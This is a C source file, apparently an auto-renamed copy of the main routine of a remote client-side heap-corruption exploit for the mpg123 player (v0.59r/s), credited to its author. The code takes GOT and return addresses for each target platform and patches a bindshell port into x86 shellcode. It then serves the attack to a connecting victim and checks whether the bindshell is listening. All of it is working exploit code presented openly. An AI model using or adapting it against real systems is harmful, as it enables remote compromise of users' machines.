#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {char* p_name; int p_gotaddr; int p_requestaddr; int p_retoffset; } ;

/* Variables and functions */
 int EOF ; 
 size_t FUNC0 (int /*<<< orphan*/ ) ; 
 char* FUNC1 () ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 int FUNC3 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int gotaddr ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC5 () ; 
 size_t port ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int requestaddr ; 
 int retoffset ; 
 int sport ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ,char*,int*) ; 
 TYPE_1__* target ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int* x86_exec ; 

int FUNC9(int argc,char **argv){
 unsigned int i=0;
 int chr=0;
 char *hostptr, *nameptr="none";
 FUNC6("[*] mpg123[v0.59r,v0.59s]: remote client-side heap corruption"
 " exploit.\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo/realh"
 "alo)\n\n");
 while((chr=FUNC3(argc,argv,"p:s:g:r:+:t:l"))!=EOF){
  switch(chr){
   case 'p':
    port=FUNC0(optarg);
    break;
   case 's':
    sport=FUNC0(optarg);
    break;
   case 'g':
    FUNC7(optarg,"%x",&gotaddr);
    break;
   case 'r':
    FUNC7(optarg,"%x",&requestaddr);
    break;
   case '+':
    retoffset=(FUNC0(optarg)*4);
    break;
   case 't':
    i=0;
    while(target[i].p_name)i++;
    if(FUNC0(optarg)>=i)
     FUNC6("[!] %u is not a valid target, ignored.\n",FUNC0(optarg));
    else{
     nameptr=target[FUNC0(optarg)].p_name;
     gotaddr=target[FUNC0(optarg)].p_gotaddr;
     requestaddr=target[FUNC0(optarg)].p_requestaddr;
     retoffset=(target[FUNC0(optarg)].p_retoffset*4);
    }
    break;
   case 'l':
    FUNC5();
    break;
   default:
    FUNC8(argv[0]);
    break;
  }
 }
 if(!port)FUNC8(argv[0]);
 /* verbose display.                                               */
 FUNC6("[*] platform value base\t\t: %s.\n",nameptr);
 FUNC6("[*] fprintf GOT address\t\t: 0x%.8x.\n",gotaddr);
 FUNC6("[*] *request address location\t: 0x%.8x.\n",requestaddr);
 FUNC6("[*] *request offset(+?*4)\t: %u(=%u), ret=0x%.8x.\n\n",
 (retoffset/4),retoffset,(requestaddr+retoffset));
 /* set the bindshell port in the shellcode(byte 33/34).           */
 x86_exec[33]=(sport&0xff00)>>8;
 x86_exec[34]=(sport&0x00ff);
 /* audioserver_bind() returns the host that connected to it.      */
 hostptr=FUNC1();
 /* check the host for success, see if the bindshell is listening. */
 FUNC4(hostptr);
 FUNC6("[!] exploit failed.\n");
 FUNC2(0);
}